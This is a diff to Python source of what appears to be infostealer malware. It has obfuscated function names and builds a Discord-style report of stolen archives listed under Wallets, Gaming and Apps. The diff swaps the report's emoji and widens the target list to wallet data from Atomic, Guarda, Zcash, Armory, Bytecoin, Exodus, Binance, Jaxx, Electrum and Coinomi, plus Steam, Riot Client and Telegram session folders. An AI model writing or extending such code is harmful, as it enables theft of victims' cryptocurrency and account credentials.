@@ -957,15 +957,15 @@ def G47H3rZ1P5(paths1, paths2, paths3):
 
     wal, ga, ot = "",'',''
     if not len(W411375Z1p) == 0:
-        wal = "<:ETH:975438262053257236> •  Wallets\n"
+        wal = "<:bitcoin1:1224117919538217100> •  Wallets\n"
         for i in W411375Z1p:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(W411375Z1p) == 0:
-        ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
+        ga = "<:computerr:1164189052472393798>  •  Gaming\n"
         for i in G4M1N6Z1p:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(O7H3rZ1p) == 0:
-        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
+        ot = "<:ticket:1224119445991981058>  •  Apps\n"
         for i in O7H3rZ1p:
             ot += f"└─ [{i[0]}]({i[1]})\n"          
     headers = {
@@ -1152,10 +1152,18 @@ def G47H3r411():
     ]
 
     P47H570Z1P = [
-        [f"{roaming}/Atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
-        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
-        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
-        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
+        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
+        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
+        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
+        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
+        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
+        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
+        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
+        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
+        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
+        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
+        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
+        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
 
